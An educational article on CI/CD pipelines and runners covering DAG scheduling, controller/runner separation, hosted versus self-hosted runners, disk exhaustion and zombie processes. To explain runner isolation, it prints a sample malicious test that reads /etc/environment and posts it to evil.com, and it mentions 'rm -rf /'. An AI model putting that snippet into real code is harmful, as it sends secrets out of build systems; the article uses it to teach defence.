---
title: "Pipelines and Runners"
description: "Understand the split-brain architecture of CI/CD, how controllers dispatch work, and the security model of executing untrusted code."
overview: "Master the mechanics of pipeline execution. Learn how Directed Acyclic Graphs dictate flow, how runners operate in isolation, and the hidden risks of self-hosting."
tags: ["runners", "architecture", "execution"]
order: 3
id: article-cicd-fundamentals-pipelines-and-runners
---

## Table of Contents

1. [What Exactly Is a Pipeline?](#what-exactly-is-a-pipeline)
2. [The Split-Brain Architecture](#the-split-brain-architecture)
3. [Hosted vs. Self-Hosted Runners](#hosted-vs-self-hosted-runners)
4. [Anatomy of a Job Workspace](#anatomy-of-a-job-workspace)
5. [Execution Contexts: Shell vs. Container](#execution-contexts-shell-vs-container)
6. [A Real Runner Failure: Disk Space Exhaustion](#a-real-runner-failure-disk-space-exhaustion)
7. [The Ephemeral Security Model](#the-ephemeral-security-model)
8. [Zombie Processes and Cleanup](#zombie-processes-and-cleanup)
9. [Tradeoffs: Provider Limits vs. Fleet Management](#tradeoffs-provider-limits-vs-fleet-management)

## What Exactly Is a Pipeline?

When developers say "the pipeline failed," they are referring to a specific run of a workflow. But mathematically and structurally, a pipeline is a Directed Acyclic Graph (DAG). 

A DAG is a collection of nodes (jobs) connected by directional edges (dependencies) with no loops. In practical terms, this means you can define complex workflows where jobs run in parallel, fan out, and fan back in, but a job can never depend on itself or create an infinite loop.

Imagine a pipeline with four jobs:
1. `Lint`
2. `Unit Tests`
3. `Integration Tests` (depends on `Lint` and `Unit Tests`)
4. `Build Docker Image` (depends on `Integration Tests`)

When you push code, the CI system parses this DAG. It sees that `Lint` and `Unit Tests` have no dependencies, so it starts them both immediately, in parallel. Once both finish successfully, it starts `Integration Tests`. If `Unit Tests` fails, the pipeline halts; `Integration Tests` and `Build Docker Image` are immediately marked as "Skipped" or "Canceled" because their prerequisite failed.

Understanding pipelines as a DAG is critical because it forces you to think about optimization. If you put all your tests into a single massive job, they run sequentially. If you split them into parallel nodes in the DAG, your pipeline finishes much faster.

## The Split-Brain Architecture

A common misconception is that the server showing you the CI dashboard is the same server running your `npm install` command. This is almost never true. Modern CI/CD systems use a strictly split-brain architecture: the **Controller** and the **Runner**.

The **Controller** (sometimes called the Server, Control Plane, or Coordinator) is the brain of the operation. It is responsible for:
- Receiving Webhooks from Git (e.g., "A pull request was opened").
- Parsing your YAML pipeline definitions to build the DAG.
- Checking your billing limits and repository permissions.
- Dispatching jobs to available Runners.
- Providing the UI where you view logs and click buttons.

The **Runner** (sometimes called the Agent, Executor, or Worker) is the muscle. It is a dumb terminal whose only job is to execute whatever shell script the Controller sends it, stream the text output back to the Controller, and report the final exit code.

This split is necessary for security and scale. If the Controller executed the jobs itself, a malicious developer could write a pipeline that runs `rm -rf /` or launches a cryptominer, taking down the entire CI/CD infrastructure for the company. By pushing execution out to disposable, isolated Runners, the Controller stays safe.

## Hosted vs. Self-Hosted Runners

When a job is dispatched, where does the Runner actually live? You have two choices.

**Hosted Runners** are maintained by the CI provider (GitHub, GitLab, CircleCI). They are a pool of virtual machines sitting in a massive cloud provider data center. When the Controller schedules your job, it requests a pristine, freshly-booted VM from the pool. The VM runs your job, streams the logs, and is immediately destroyed. 
- **The Pros:** Zero maintenance. You never have to patch the OS or clean up disk space. Total isolation ensures no state leaks between builds.
- **The Cons:** You pay by the minute. The machines are usually low-spec (e.g., 2 vCPUs, 7GB RAM). They cannot easily access databases hidden inside your company's private network.

**Self-Hosted Runners** are machines that you provision and maintain. You install a small agent program on an EC2 instance, a Raspberry Pi, or a Kubernetes cluster, and register it with the Controller.
- **The Pros:** Cheaper if you run thousands of builds a day. You can provision massive 64-core machines for heavy C++ compilation. They sit inside your VPC, so they can easily query your private staging databases or internal APIs during integration tests.
- **The Cons:** You are responsible for the machine. If a build downloads 50GB of Docker images and doesn't clean up, the next build will fail when the disk runs out of space. If a malicious script escapes the runner process, your internal network is compromised.

Self-hosted runners communicate with the Controller via **Long Polling**. They open an outbound HTTPS connection to the Controller and hold it open, asking "Do you have work for me?" When a job arrives, the Controller sends the payload down that open connection. This design means you never have to open inbound firewall ports to let the Controller reach into your private network.

## Anatomy of a Job Workspace

When a Runner picks up a job, it creates an isolated workspace. If you are debugging a complex pipeline, you need to know exactly what is happening on the disk during those first few seconds.

1. **Initialization**: The Runner software creates a temporary working directory (e.g., `/home/runner/work/my-repo`).
2. **Environment Injection**: The Runner receives the secrets and environment variables required for this specific job and exports them into its local memory.
3. **Checkout**: Almost every job starts with a "Checkout" step. The Runner executes a `git clone` or `git fetch` to pull the specific commit hash that triggered the pipeline into the working directory.
4. **Execution**: The Runner starts executing your `steps` sequentially inside the working directory.

If your pipeline fails saying `File not found: package.json`, the first thing to check is whether you actually included the Checkout step. The Runner boots up entirely empty. It does not magically have your code until you tell it to fetch the code.

## Execution Contexts: Shell vs. Container

When you define a `run` step in a pipeline, how does it execute?

By default, most runners execute commands directly in a **Shell Context**. If the runner is an Ubuntu machine, the command runs in `bash`. If the runner is a Windows machine, the command runs in PowerShell. This means your job is at the mercy of whatever software happens to be pre-installed on the runner's OS. If you need Node.js 18 but the runner only has Node.js 14 installed, your build will fail.

To solve this dependency hell, modern CI systems support **Container Contexts**. Instead of running your commands directly on the host OS, the Runner launches a Docker container of your choosing, mounts the working directory into it, and executes your commands inside the container.

```yaml
jobs:
  build:
    runs-on: ubuntu-latest
    container: node:18-alpine
    steps:
      - uses: actions/checkout@v4
      - run: node --version
```

In this example, even though the host runner is Ubuntu, the `run` step executes inside a lightweight Alpine Linux container with Node.js 18 guaranteed to be present. This completely eliminates "missing dependency" errors on runners.

## A Real Runner Failure: Disk Space Exhaustion

Let's look at a failure mode that exclusively plagues self-hosted runners, or massive monorepo builds on hosted runners.

Imagine your pipeline is building a complex Java application that builds multiple Docker images as part of its integration test suite. Everything runs fine for weeks. Then, randomly, a build fails with this log:

```text
> docker build -t my-app-integration .

Step 1/12 : FROM openjdk:17-jdk-slim
 ---> 8b212f451000
Step 2/12 : WORKDIR /app
 ---> Running in a2c83ff5a6b0
Step 3/12 : COPY . .
failed to copy files: failed to copy directory: write /var/lib/docker/overlay2/temp/file: no space left on device
Error: Process completed with exit code 1.
```

The error is `no space left on device`. This happens because CI jobs generate an enormous amount of temporary data: Git history, downloaded npm/maven packages, temporary build artifacts, and Docker layer caches.

If you are using a Hosted Runner, the disk is wiped clean after every single job. However, standard hosted runners often only provide about 14GB of usable free space. If your Docker build requires pulling 20GB of base images and compiling massive binaries, you will hit the wall mid-build. The fix is to configure a runner with a larger disk or selectively delete pre-installed software at the start of your pipeline.

If you are using a Self-Hosted Runner, the problem is chronic. Successive jobs run on the same persistent disk. Every `docker build` leaves behind cached image layers. If you do not have an automated cleanup script (like a cron job running `docker system prune -a --volumes` every night), the disk will slowly fill up over weeks until a random build pushes it over the edge and crashes.

## The Ephemeral Security Model

Why do CI providers throw away the entire Virtual Machine after every single job? Because of state pollution and security.

State pollution is the "It works on my machine" problem scaled up. If Job A installs a global npm package and Job B (which runs an hour later) accidentally relies on that package without declaring it, Job B passes. But Job B is broken. By destroying the runner, the CI provider guarantees a truly blank slate for every execution.

The security aspect is even more critical. If you are developing an open-source project, anyone on the internet can open a pull request. When they open a PR, your CI pipeline runs automatically to test their code. This means they can write a test file that contains this:

```javascript
// malicious.test.js
const fs = require('fs');
test('exfiltrate secrets', () => {
  const env = fs.readFileSync('/etc/environment', 'utf8');
  fetch('https://evil.com/steal', { method: 'POST', body: env });
  expect(true).toBe(true);
});
```

Because the CI system executes untrusted code from strangers, it must assume the runner is immediately compromised the moment the `npm test` step begins. By using an ephemeral VM, the CI provider ensures that even if the malicious code installs a backdoor or corrupts the OS, the entire machine ceases to exist three minutes later.

This is why you must **never** attach a self-hosted runner to a public repository. If you do, a malicious actor can open a PR, escape the runner process, and establish a permanent backdoor into your internal corporate network, long after the CI job finishes.

## Zombie Processes and Cleanup

Another subtle failure mode of self-hosted runners involves process management. 

When a pipeline is canceled by a user (they click the "Cancel Workflow" button in the UI), the Controller sends a signal to the Runner telling it to abort. The Runner sends a `SIGTERM` to the shell script it was executing.

However, if your pipeline started a background web server (e.g., `npm run start-server &`), that background process might not receive the kill signal. The main pipeline script dies, the Runner reports the job as canceled, and it prepares for the next job. But the background web server is still running on the machine. This is a **zombie process**.

When the next job arrives and tries to start the web server to run its own tests, it crashes with `EADDRINUSE: port 8080 is already in use`. 

This teaches a crucial lesson about runner architecture: the Runner software is not a magical container. It is just a process executing shell scripts. If your script launches background daemons, creates massive files in `/tmp`, or mutates system routing tables, those changes persist on self-hosted runners and will quietly destroy the reliability of your pipelines.

## Tradeoffs: Provider Limits vs. Fleet Management

As an engineering organization grows, the decision of where code runs becomes a major architectural debate.

**Provider Limits**: Relying on Hosted Runners is incredibly easy, but you are artificially constrained. You are limited to the CPU architectures they offer (usually x86 and maybe ARM). You are limited to their maximum job timeouts (e.g., a job is forcefully killed after 6 hours). You are subjected to their noisy-neighbor problems if their data center is under heavy load.

**Fleet Management**: Running your own fleet of self-hosted runners solves the limits, but creates an operations team. You now have to monitor CPU and disk usage on the runner fleet. You have to implement auto-scaling so you don't pay for idle servers overnight. You have to handle OS patching and vulnerability scanning for the runner AMIs.

For a junior developer, a pipeline is just a YAML file. For a senior DevOps engineer, a pipeline is a distributed computing platform that must balance isolation, security, cost, and speed.

---

**References**

- [GitHub Actions: About Self-hosted Runners](https://docs.github.com/en/actions/hosting-your-own-runners/managing-self-hosted-runners/about-self-hosted-runners) - Architectural overview of how self-hosted runners poll for work and the security risks involved.
- [GitLab CI/CD Architecture](https://docs.gitlab.com/runner/) - Comprehensive breakdown of how GitLab Runners execute jobs across shell, Docker, and Kubernetes executors.
- [POSIX Signals and Process Groups](https://man7.org/linux/man-pages/man7/signal.7.html) - Underlying OS mechanics of why background processes become zombies when pipelines are abruptly canceled.
